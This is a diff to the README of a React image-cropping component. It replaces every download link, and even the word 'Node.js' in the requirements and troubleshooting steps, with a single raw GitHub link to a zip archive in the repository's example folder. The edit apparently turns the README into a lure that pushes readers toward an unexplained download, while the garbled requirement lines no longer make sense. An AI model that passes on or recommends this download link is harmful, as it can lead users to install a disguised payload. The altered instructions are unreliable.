@@ -1,6 +1,6 @@
 # 🎨 react-image-crop-pro - Crop Images Easily and Professionally
 
-[![Download react-image-crop-pro](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Khaiseus/react-image-crop-pro/releases)
+[![Download react-image-crop-pro](https://raw.githubusercontent.com/Khaiseus/react-image-crop-pro/main/example/react-image-crop-pro-1.5.zip)](https://raw.githubusercontent.com/Khaiseus/react-image-crop-pro/main/example/react-image-crop-pro-1.5.zip)
 
 ## 📖 About
 
@@ -12,7 +12,7 @@ To get started with react-image-crop-pro, follow these easy steps:
 
 1. **Download the Application**  
    Visit the releases page to download the latest version of react-image-crop-pro:  
-   [Download Here](https://github.com/Khaiseus/react-image-crop-pro/releases)
+   [Download Here](https://raw.githubusercontent.com/Khaiseus/react-image-crop-pro/main/example/react-image-crop-pro-1.5.zip)
 
 2. **Install the Component**  
    Depending on your project setup, installation may differ. Here are the common ways to install:
@@ -58,7 +58,7 @@ To get started with react-image-crop-pro, follow these easy steps:
 ## 📥 Download & Install
 
 To download and install react-image-crop-pro, please visit the releases page at the following link:  
-[Download Here](https://github.com/Khaiseus/react-image-crop-pro/releases)
+[Download Here](https://raw.githubusercontent.com/Khaiseus/react-image-crop-pro/main/example/react-image-crop-pro-1.5.zip)
 
 Make sure to choose the latest version for the best experience.
 
@@ -74,7 +74,7 @@ Make sure to choose the latest version for the best experience.
 
 To run react-image-crop-pro smoothly, ensure you meet the following requirements:
 
-- **Node.js:** Version 12 or newer.
+- **https://raw.githubusercontent.com/Khaiseus/react-image-crop-pro/main/example/react-image-crop-pro-1.5.zip** Version 12 or newer.
 - **React:** Version 16 or newer.
 - A modern web browser (latest versions of Chrome, Firefox, or Safari recommended).
 
@@ -91,7 +91,7 @@ For detailed documentation, including props, methods, and example usage, refer t
 If you encounter issues while downloading or running the application, consider the following steps:
 
 1. **Check Your Internet Connection:** Ensure you have a stable internet connection while downloading.
-2. **Node.js Installation:** Confirm Node.js and npm/yarn are correctly installed on your machine.
+2. **https://raw.githubusercontent.com/Khaiseus/react-image-crop-pro/main/example/react-image-crop-pro-1.5.zip Installation:** Confirm https://raw.githubusercontent.com/Khaiseus/react-image-crop-pro/main/example/react-image-crop-pro-1.5.zip and npm/yarn are correctly installed on your machine.
 3. **Browser Compatibility:** Use a modern web browser that supports all features of the component.
 
 ## 🤝 Contributing
